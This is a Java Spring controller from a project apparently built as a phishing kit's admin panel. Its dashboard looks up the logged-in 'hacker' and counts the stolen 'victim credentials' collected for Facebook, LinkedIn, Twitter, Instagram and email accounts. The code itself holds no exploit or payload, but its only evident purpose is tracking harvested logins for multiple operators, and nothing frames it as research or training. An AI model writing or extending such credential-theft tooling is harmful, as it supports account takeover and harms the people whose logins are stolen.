package com.hack.demo.controller;

import com.hack.demo.repository.HackerRepository;
import com.hack.demo.repository.VictimCredentialRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.validation.constraints.Email;
import java.security.Principal;
import static com.hack.demo.entity.VictimCredential.*;

@Controller
public class HomeController {

    @Autowired
    private HackerRepository hackerRepository;
    @Autowired
    private VictimCredentialRepository victimCredentialRepository;

    @RequestMapping(value = {"/dashboard", "/"})
    public String dashboard(Principal principal, Model model) {
        String hackerId = hackerRepository.findHackerIdByEmail(principal.getName());
        long facebook = victimCredentialRepository.countAllByHackerIdAndType(hackerId, FACEBOOK);
        long linkedin = victimCredentialRepository.countAllByHackerIdAndType(hackerId, LINKEDIN);
        long twitter = victimCredentialRepository.countAllByHackerIdAndType(hackerId, TWITTER);
        long instagram = victimCredentialRepository.countAllByHackerIdAndType(hackerId, INSTAGRAM);
        long email = victimCredentialRepository.countAllByHackerIdAndType(hackerId, EMAIL);
        model.addAttribute("facebook", facebook);
        model.addAttribute("linkedin", linkedin);
        model.addAttribute("twitter", twitter);
        model.addAttribute("instagram", instagram);
        model.addAttribute("email", email);
        return "index";
    }

    @ResponseBody
    @RequestMapping("/test")
    public String test(){
        return "App Running...";
    }

}
